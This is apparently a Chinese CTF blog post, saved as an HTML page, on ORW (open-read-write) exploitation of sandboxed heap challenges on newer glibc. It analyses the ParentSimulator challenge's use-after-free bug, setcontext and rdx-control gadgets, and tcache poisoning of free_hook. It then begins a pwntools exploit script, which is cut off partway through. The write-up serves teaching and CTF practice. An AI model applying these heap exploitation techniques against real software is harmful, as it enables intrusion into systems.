@@ -1,0 +1,630 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;light&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/1.png">
+  <link rel="icon" href="/img/bg/1.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="PWN中ORW的解题手法与万金油Gadgets，首发于安全客https://www.anquanke.com/post/id/236832">
+  <meta name="author" content="N1K0_">
+  <meta name="keywords" content="">
+  
+  <title>Heap：高版本ORW的解题手法与万金油Gadgets - N1K0_  Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"BC8977lXvuPHlruJsv3NsMKh-gzGzoHsz","app_key":"U5wynESljzvPrIHxNglF7gF1","server_url":"https://bc8977lx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N1K0_'s Workshop</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://gitee.com/wang842948487/IMGbase/raw/master/img/20210430135301.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Heap：高版本ORW的解题手法与万金油Gadgets">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      N1K0_
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-05 00:30" pubdate>
+        2021年4月5日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      69
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Heap：高版本ORW的解题手法与万金油Gadgets</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Heap：高版本ORW的解题手法与万金油Gadgets"><a href="#Heap：高版本ORW的解题手法与万金油Gadgets" class="headerlink" title="Heap：高版本ORW的解题手法与万金油Gadgets"></a>Heap：高版本ORW的解题手法与万金油Gadgets</h1><blockquote>
+<p>本文首发于安全客 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p>
+<p>现在PWN越来越卷，很多题目都有沙箱，需要ORW来读flag，本文以MAR DASCTF 2021中的ParentSimulator为例，由复杂到简单介绍几种ORW类题目的解题手法，以及一些好用的Gadgets,</p>
+</blockquote>
+<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p><code>ORW</code>类题目是指程序开了沙箱保护，禁用了一些函数的调用（如 <code>execve</code>等），使得我们并不能正常 <code>get shell</code>，只能通过<code>ROP</code>的方式调用<code>open</code>, <code>read</code>, <code>write</code>的来读取并打印<code>flag</code> 内容 </p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>read(fd,buf,<span class="hljs-built_in">len</span>)<br>write(<span class="hljs-number">1</span>,buf,<span class="hljs-built_in">len</span>)<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h3><p>在实战中我们可以通过 <code>seccomp-tools</code>来查看程序是否启用了沙箱, <code>seccomp-tools</code>工具安装方法如下:</p>
+<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">$ sudo apt install gcc ruby-dev<br>$ gem install seccomp-tools<br></code></pre></div></td></tr></table></figure>
+
+<p>安装完成后通过 <code>seccomp-tools dump ./pwn</code>即可查看程序沙箱</p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210331181532754.png" srcset="/img/loading.gif" lazyload alt="image-20210331181532754"></p>
+<p>可以看到 <code>ParentSimulator</code>中禁用了 <code>execve</code>, 由于<code>system</code>函数实际上也是借由 <code>execve</code>实现的, 因此通过 <code>get shell</code>的方法来解决本题比较困难 ( 其实还是有方法的, 但不在此次咱们讨论的范围内 )</p>
+<p>那么这时候就要用到 <code>ORW</code>了</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰了，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">&lt;setcontext+<span class="hljs-number">53</span>&gt;:  mov    rsp,QWORD PTR [rdi+<span class="hljs-number">0xa0</span>]<br>&lt;setcontext+<span class="hljs-number">60</span>&gt;:  mov    rbx,QWORD PTR [rdi+<span class="hljs-number">0x80</span>]<br>&lt;setcontext+<span class="hljs-number">67</span>&gt;:  mov    rbp,QWORD PTR [rdi+<span class="hljs-number">0x78</span>]<br>&lt;setcontext+<span class="hljs-number">71</span>&gt;:  mov    r12,QWORD PTR [rdi+<span class="hljs-number">0x48</span>]<br>&lt;setcontext+<span class="hljs-number">75</span>&gt;:  mov    r13,QWORD PTR [rdi+<span class="hljs-number">0x50</span>]<br>&lt;setcontext+<span class="hljs-number">79</span>&gt;:  mov    r14,QWORD PTR [rdi+<span class="hljs-number">0x58</span>]<br>&lt;setcontext+<span class="hljs-number">83</span>&gt;:  mov    r15,QWORD PTR [rdi+<span class="hljs-number">0x60</span>]<br>&lt;setcontext+<span class="hljs-number">87</span>&gt;:  mov    rcx,QWORD PTR [rdi+<span class="hljs-number">0xa8</span>]<br>&lt;setcontext+<span class="hljs-number">94</span>&gt;:  push   rcx<br>&lt;setcontext+<span class="hljs-number">95</span>&gt;:  mov    rsi,QWORD PTR [rdi+<span class="hljs-number">0x70</span>]<br>&lt;setcontext+<span class="hljs-number">99</span>&gt;:  mov    rdx,QWORD PTR [rdi+<span class="hljs-number">0x88</span>]<br>&lt;setcontext+<span class="hljs-number">106</span>&gt;: mov    rcx,QWORD PTR [rdi+<span class="hljs-number">0x98</span>]<br>&lt;setcontext+<span class="hljs-number">113</span>&gt;: mov    r8,QWORD PTR [rdi+<span class="hljs-number">0x28</span>]<br>&lt;setcontext+<span class="hljs-number">117</span>&gt;: mov    r9,QWORD PTR [rdi+<span class="hljs-number">0x30</span>]<br>&lt;setcontext+<span class="hljs-number">121</span>&gt;: mov    rdi,QWORD PTR [rdi+<span class="hljs-number">0x68</span>]<br>&lt;setcontext+<span class="hljs-number">125</span>&gt;: <span class="hljs-keyword">xor</span>    eax,eax<br>&lt;setcontext+<span class="hljs-number">127</span>&gt;: ret    <br></code></pre></div></td></tr></table></figure>
+
+<h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>但在 <code>Glibc 2.29</code>之后 <code>setcontext</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.text:<span class="hljs-number">00000000000580</span>DD                 mov     rsp, [rdx+<span class="hljs-number">0</span>A0h]<br>.text:<span class="hljs-number">00000000000580E4</span>                 mov     rbx, [rdx+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">00000000000580</span>EB                 mov     rbp, [rdx+<span class="hljs-number">78</span>h]<br>.text:<span class="hljs-number">00000000000580</span>EF                 mov     r12, [rdx+<span class="hljs-number">48</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>3                 mov     r13, [rdx+<span class="hljs-number">50</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>7                 mov     r14, [rdx+<span class="hljs-number">58</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>B                 mov     r15, [rdx+<span class="hljs-number">60</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>F                 test    dword ptr fs:<span class="hljs-number">48</span>h, <span class="hljs-number">2</span><br>    ....<br>.text:<span class="hljs-number">00000000000581</span>C6                 mov     rcx, [rdx+<span class="hljs-number">0</span>A8h]<br>.text:<span class="hljs-number">00000000000581</span>CD                 push    rcx<br>.text:<span class="hljs-number">00000000000581</span>CE                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">00000000000581</span>D2                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">00000000000581</span>D6                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">00000000000581</span>DD                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">00000000000581E1</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">00000000000581E5</span>                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">00000000000581</span>EC                 <span class="hljs-keyword">xor</span>     eax, eax<br>.text:<span class="hljs-number">00000000000581</span>EE                 retn<br></code></pre></div></td></tr></table></figure>
+
+<p>但如果搜索过相应gadgets的同学应该有感受， 很难找到能够直接控制rdx寄存器的gadgets，这时候就需要常备一些 <code>万金油</code>gadgets，具体的gadgets在下文结合题目解法一同介绍</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目链接如下：</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw">https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw</a><br>提取码：y895 </p>
+<p>首先分析一下题目，程序中可以 <code>创建</code>、<code>删除</code>、  <code>改名</code>、 <code>改描述</code>、<code>更改一次性别</code>、<code>退出</code></p>
+<p>据此可以分析出<code>chunk</code>的结构</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-number">0x0</span> → pre_size<br><br><span class="hljs-number">0x8</span> → size<br><br><span class="hljs-number">0x10</span> → name<br><br><span class="hljs-number">0x18</span> → gender<br><br><span class="hljs-number">0x20</span> → des <br><br>.....<br></code></pre></div></td></tr></table></figure>
+
+<p>打开IDA分析一下程序的各个功能</p>
+<h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><p>如图可以看出程序最多可以申请10个堆块，同时会维护两个数组，分别是<code>chunk_list</code>和<code>chunk_list_flag</code>, 其中前者储存申请的chunk地址，而后者则会依据申请堆块的序号把数组对应位置写为<code>1</code></p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210331222551085.png" srcset="/img/loading.gif" lazyload alt="image-20210331222551085"></p>
+<h4 id="改名"><a href="#改名" class="headerlink" title="改名"></a>改名</h4><p>逻辑很简单，在改名前会检查<code>chunk_list_flag</code>对应位置是否为1</p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210331223228998.png" srcset="/img/loading.gif" lazyload alt="image-20210331223228998"></p>
+<h4 id="改描述"><a href="#改描述" class="headerlink" title="改描述"></a>改描述</h4><p>逻辑很简单，修改前也会检查 <code>chunk_list_flag</code></p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210331223254007.png" srcset="/img/loading.gif" lazyload alt="image-20210331223254007"></p>
+<h4 id="改性别（只能一次）"><a href="#改性别（只能一次）" class="headerlink" title="改性别（只能一次）"></a>改性别（只能一次）</h4><p>这个函数就不太一样了，他在修改性别前没有检查<code>chunk_list_flag</code>，而且会先打印当前性别</p>
+<p>试想一下，如果目标堆块处于 <code>tcache</code>中，那么修改性别就能泄露 <code>堆地址</code></p>
+<p>如果目标堆块处于 <code>unsort bin</code>中，那么修改性别就有可能泄露 <code>libc地址</code></p>
+<p>（不过其实出题人提供这个函数是为了降低难度，即便不调用这个函数也可以通过<code>double free</code>来泄露相关地址）</p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210331223324096.png" srcset="/img/loading.gif" lazyload alt="image-20210331223324096"></p>
+<h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><p>程序的主要漏洞就出在释放函数中，可见函数并没有检查 <code>chunk_list_flag</code>，且释放后并没有将 <code>chunk_list</code>置0，存在uaf</p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210331223535743.png" srcset="/img/loading.gif" lazyload alt="image-20210331223535743"></p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>经过上面的分析，我们的思路就很清楚了<br>首先利用 <code>释放</code>功能中的漏洞进行 <code>double free</code>，构造堆块重叠从而泄露 <code>堆地址</code>和 <code>libc地址</code></p>
+<p>之后通过 <code>tcache投毒</code>向<code>free_hook</code>中写入gadget，使得用户在 <code>free</code>时可以通过 <code>free_hook</code>中布置的gadgets劫持程序执行流程到我们可控的地址</p>
+<p>最后在可控的地址部署 <code>ORW</code>的 <code>ROP Chains</code>，执行 <code>free</code>，输出 <code>flag</code></p>
+<p>以上就是比较常规的思路，其中的难点就在于寻找合适的 gadgets来劫持控制流，下面我们来讲一下具体实现</p>
+<h3 id="解法1-Gadget-setcontext"><a href="#解法1-Gadget-setcontext" class="headerlink" title="解法1  Gadget+setcontext"></a>解法1  Gadget+setcontext</h3><p>解法一和上文介绍的思路完全相同</p>
+<p>这其中用到的 <code>gadget</code>是 <code>getkeyserv_handle+576</code>，其汇编如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">mov     rdx, [rdi+8]<br>mov     [rsp+0C8h+var_C8], rax<br>call    qword ptr [rdx+20h]<br></code></pre></div></td></tr></table></figure>
+
+<p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29到2.32都可用</p>
+<p>控制 <code>rdx</code>之后，我们就可以通过 <code>setcontext</code>来控制其他寄存器了</p>
+<p>这里需要注意的是，根据我们分析的chunk结构， <code>rdi+8</code>位置的内容应该是 <code>性别</code>，因此我们在调用该gadget前需要先构造堆块重叠，控制 <code>rdi+8</code>的内容，详见EXP</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#__author__:N1K0_</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> inspect<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">var</span>):</span><br>    callers_local_vars = inspect.currentframe().f_back.f_locals.items()<br>    temp =  [var_name <span class="hljs-keyword">for</span> var_name, var_val <span class="hljs-keyword">in</span> callers_local_vars <span class="hljs-keyword">if</span> var_val <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]<br>    p.info(temp + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(var))<br><br>s      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>plt     = <span class="hljs-keyword">lambda</span> data               :elf.plt[data]<br>got     = <span class="hljs-keyword">lambda</span> data               :elf.got[data]<br>sym     = <span class="hljs-keyword">lambda</span> data               :libc.sym[data]<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>local_libc_32 = <span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>context.binary = binary<br>elf = ELF(binary,checksec=<span class="hljs-literal">False</span>)<br><br>p = process(binary)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;r&#x27;</span>:<br>        p = remote(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">1</span>)<br>libc = elf.libc<br><span class="hljs-comment"># libc = ELF(remote_libc)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    os.system(<span class="hljs-string">&#x27;tmux set mouse on&#x27;</span>)<br>    context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>    gdb.attach(p,cmd)<br>    pause()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">chunk_list = 0x40A0 </span><br><span class="hljs-string">chunk_list_flag = 0x04060</span><br><span class="hljs-string">gender_chance = 0x4010</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># start </span><br><span class="hljs-comment"># context.log_level = &#x27;DEBUG&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,sex,name</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;2.Girl:\n&#x27;</span>,<span class="hljs-built_in">str</span>(sex))<br>    sa(<span class="hljs-string">&quot;Please input your child&#x27;s name:\n&quot;</span>,name)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_edit</span>(<span class="hljs-params">idx,name</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    